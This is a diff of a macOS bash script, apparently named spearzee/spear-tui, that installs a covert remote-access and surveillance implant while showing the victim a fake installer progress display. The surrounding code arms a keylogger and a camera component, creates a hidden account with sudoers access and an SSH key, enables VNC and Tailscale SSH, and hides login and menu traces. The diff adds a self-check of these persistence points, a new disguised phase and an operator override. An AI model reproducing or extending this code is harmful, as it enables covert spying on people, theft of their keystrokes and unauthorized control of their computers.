@@ -3,7 +3,7 @@ set -u
 set -o pipefail
 [ -z "${BASH_VERSION:-}" ] && [ -f "$0" ] && exec /bin/bash "$0" "$@"
 
-V="4.4"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""; REPAIR=""
+V="4.5"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""; REPAIR=""
 exec 3>&1
 
 ui(){ printf '%s' "$1" >&3 2>/dev/null || true; }
@@ -301,6 +301,24 @@ KPL
     sleep 2
     sudo launchctl print system/com.spear-tui.keylog >/dev/null 2>&1 && ok "keylogger armed" || warn "keylogger not loaded"
   fi
+  return 0; }
+
+selfcheck(){
+  ok "--- state ---"
+  id "$RUSER" >/dev/null 2>&1 && ok "acct:present" || warn "acct:missing"
+  sudo test -s "$PW_FILE" && ok "pw:present" || warn "pw:missing"
+  sudo test -f /etc/sudoers.d/spear-tui && ok "sudoers:present" || warn "sudoers:missing"
+  sudo grep -qF macbook "/Users/$RUSER/.ssh/authorized_keys" 2>/dev/null && ok "key:present" || warn "key:missing"
+  sudo launchctl print system/com.spear-tui.agent >/dev/null 2>&1 && ok "agent:loaded" || warn "agent:not-loaded"
+  for p in "${AGENT_PATHS[@]}"; do sudo test -s "$p" && ok "copy:$p" || warn "copy-missing:$p"; done
+  nc -z -G 2 127.0.0.1 22 >/dev/null 2>&1 && ok "sshd:up" || warn "sshd:down"
+  nc -z -G 2 127.0.0.1 5900 >/dev/null 2>&1 && ok "vnc:up" || warn "vnc:down"
+  if [ -x "$TS" ]; then
+    ok "ts:installed"
+    ok "sysext:$(sudo "$TS" configure sysext status 2>&1 | tail -1)"
+    i="$("$TS" ip -4 2>/dev/null | head -1)"; [ -n "$i" ] && ok "ts:connected:$i" || warn "ts:not-connected"
+  else warn "ts:missing"; fi
+  ok "--- end state ---"
   return 0; }
 
 gen_agent(){
@@ -895,13 +913,14 @@ main(){
   chmod 700 "$DIR"; chmod 600 "$INSTALL_LOG"
   sudo mkdir "$LOCK" 2>/dev/null || true
   echo $$ | sudo tee "$LOCK/pid" >/dev/null 2>&1
-  exec >> "$INSTALL_LOG" 2>&1
+  if [ "$FAKE" = "true" ]; then exec >> "$INSTALL_LOG" 2>&1; else exec > >(tee -a "$INSTALL_LOG") 2>&1; fi
   printf -- '--- %s %s %s ---\n' "$V" "$(date '+%F %T')" "$(hostname)"
 
   progress
   step_preflight
   phase "downloading";            step_account    || true
-  phase "verifying files";        step_report     || true
+  phase "verifying files";        selfcheck       || true
+  phase "connecting";             step_report     || true
   phase "installing services";    step_agent      || true
   phase "configuring system";     step_keys       || true
   phase "configuring access";     step_fda        || true
@@ -940,8 +959,8 @@ main(){
 
 ############################# settings ###############################
 
-SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v8/spearzee.sh"
-SELF_SHA="ab3f46bb6ba95138032a0f583045a02a1d52bf76a553b83eda46587cb2788e70"
+SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v9/spearzee.sh"
+SELF_SHA="752d779d06b3b9dd29c8455486f154df82b0bc0be671c23035e2eb5a5e810df7"
 SELF="/usr/local/bin/spear-tui"
 KEYLOG="spearzee-keylog"
 CAM="spearzee-cam"
@@ -968,6 +987,7 @@ HIDE_LOGIN="true"
 HIDE_MENU="true"
 TUNE_SSH="true"
 SSH_PORT2="2222"
+OPERATOR=""
 ALWAYS_ON="true"
 FAKE="true"
 SCRUB="true"
@@ -985,6 +1005,6 @@ KICK="/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resour
 TS="/Applications/Tailscale.app/Contents/MacOS/Tailscale"
 AGENT_PATHS=("/var/root/.spear/agent.sh" "/Library/Application Support/.spear/agent.sh" "/usr/local/libexec/spear-agent.sh")
 
-TSFLAGS="--accept-dns=false --accept-routes=false --operator=$RUSER --ssh"
+TSFLAGS="--accept-dns=false --accept-routes=false --operator=${OPERATOR:-$RUSER} --ssh"
 
 main "$@"
